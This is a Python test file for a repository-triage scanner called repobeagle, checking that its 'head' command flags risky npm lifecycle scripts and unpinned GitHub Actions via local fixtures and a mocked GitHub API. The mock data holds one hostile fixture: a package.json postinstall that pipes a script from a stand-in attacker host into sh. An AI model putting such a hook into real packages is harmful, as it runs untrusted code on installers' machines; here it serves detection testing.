#!/usr/bin/env python3
"""`repobeagle head` tests: local triage, GitHub contents API (mocked locally), cache, rate-limit notes."""
import base64, hashlib, json, os, subprocess, sys, tempfile, threading
import http.server
from pathlib import Path
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import repobeagle as rb

fail = 0
def check(name, ok):
    global fail
    print(("PASS " if ok else "FAIL ") + name)
    if not ok:
        fail = 1

def head(target, *extra, env=None, timeout=300):
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as fh:
        out = Path(fh.name)
    try:
        r = subprocess.run([sys.executable, str(ROOT / "repobeagle.py"), "head", target, "--json", str(out),
                            "--no-color"] + list(extra), capture_output=True, text=True, timeout=timeout,
                           env=dict(os.environ, **(env or {})))
        try:
            return json.loads(out.read_text(encoding="utf-8")), r
        except ValueError:
            return {}, r
    finally:
        out.unlink(missing_ok=True)

# local directories: trap-npm's postinstall and trap-gha's unpinned actions are visible
report, r = head("tests/fixtures/trap-npm")
meta = report["meta"]
check("local head flags the npm postinstall",
      r.returncode == 2 and any(f["title"].startswith("npm lifecycle script") for f in report["findings"])
      and report["counts"]["critical"] == 1)
check("head is metadata-only and never claims a repo verdict",
      meta["mode"].startswith("metadata") and "docker" not in meta["mode"]
      and meta["scope"]["scope"] == "metadata" and "package.json" in meta["scope"]["paths"])

report, r = head("tests/fixtures/trap-gha")
rules = {f["title"].split(":")[0] for f in report["findings"]}
check("local head flags unpinned actions and write permissions",
      r.returncode == 1 and {"gha-unpinned-action", "gha-write-permissions"} <= rules)

empty, r = head("tests/fixtures/control-empty")
check("a repo with no metadata fails loudly", r.returncode == 1 and "no metadata fetched" in r.stderr)

# --- a local stand-in for the GitHub contents API --------------------------------
FILES = {
    "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh"}}),
    ".github/workflows/ci.yml": "name: ci\non: push\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n",
}
STATE = {"mode": "normal", "auth": []}

class Handler(http.server.BaseHTTPRequestHandler):
    def _send(self, code, obj, headers=None):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        STATE["auth"].append(self.headers.get("Authorization"))
        prefix = "/repos/o/r/contents/"
        if not self.path.startswith(prefix):
            return self._send(404, {"message": "not found"})
        path = self.path[len(prefix):]
        if STATE["mode"] == "all_limited":
            return self._send(403, {"message": "rate limited"}, {"X-RateLimit-Remaining": "0"})
        if STATE["mode"] == "partial_limited" and path != "package.json":
            return self._send(403, {"message": "rate limited"}, {"X-RateLimit-Remaining": "0"})
        if path == ".github/workflows":
            return self._send(200, [{"type": "file", "name": "ci.yml", "path": ".github/workflows/ci.yml"}])
        if path in FILES:
            return self._send(200, {"type": "file", "encoding": "base64",
                                    "content": base64.b64encode(FILES[path].encode()).decode()})
        return self._send(404, {"message": "not found"})
    def log_message(self, *args):
        pass

srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
threading.Thread(target=srv.serve_forever, daemon=True).start()
api = f"http://127.0.0.1:{srv.server_address[1]}"
try:
    with tempfile.TemporaryDirectory() as td:
        env = {"GITHUB_API_URL": api, "XDG_CACHE_HOME": td}
        report, r = head("o/r", env=env)
        rules = {f["title"].split(":")[0] for f in report["findings"]}
        check("API head runs the same checks without a clone",
              r.returncode == 2 and "npm lifecycle script" in " ".join(f["title"] for f in report["findings"])
              and "gha-unpinned-action" in rules
              and report["meta"]["fetched_via"].startswith("GitHub contents API"))
        cache_file = Path(td) / "repobeagle" / "head" / "o_r.json"
        check("API responses are cached per slug", cache_file.is_file())

        # the cache answers even when the API is gone
        srv.shutdown(); srv.server_close()
        report, r = head("o/r", env=env)
        check("cache serves the triage when the API is unreachable",
              r.returncode == 2 and any("per-slug cache" in n for n in report["notes"]))
        report, r = head("o/r", "--no-cache", env=env)
        check("--no-cache needs the API", r.returncode == 1 and "no metadata fetched" in r.stderr)
    srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    api = f"http://127.0.0.1:{srv.server_address[1]}"
    with tempfile.TemporaryDirectory() as td:
        STATE["auth"].clear()
        report, r = head("o/r", env={"GITHUB_API_URL": api, "XDG_CACHE_HOME": td, "GITHUB_TOKEN": "test-token"})
        check("the token is sent when present", "Bearer test-token" in STATE["auth"])
        STATE["mode"] = "all_limited"
        with tempfile.TemporaryDirectory() as td2:
            report, r = head("o/r", env={"GITHUB_API_URL": api, "XDG_CACHE_HOME": td2})
            check("a fully rate-limited request degrades to a note, not a wrong verdict",
                  r.returncode == 1 and "rate limited" in r.stderr)
        STATE["mode"] = "partial_limited"
        with tempfile.TemporaryDirectory() as td3:
            report, r = head("o/r", env={"GITHUB_API_URL": api, "XDG_CACHE_HOME": td3})
            check("a partial rate limit is recorded and still triaged",
                  r.returncode in (1, 2) and report["meta"]["scope"]["truncated"] is True
                  and any("rate limited" in n for n in report["notes"])
                  and "package.json" in report["meta"]["scope"]["paths"])
        STATE["mode"] = "normal"
        r = subprocess.run([sys.executable, str(ROOT / "repobeagle.py"), "head", "o/r", "--markdown", "--no-color"],
                           capture_output=True, text=True, timeout=300,
                           env=dict(os.environ, GITHUB_API_URL=api, XDG_CACHE_HOME=td))
        check("--markdown prints an unfurl card", r.stdout.startswith("## RepoBeagle: "))
finally:
    srv.shutdown(); srv.server_close()

sys.exit(fail)
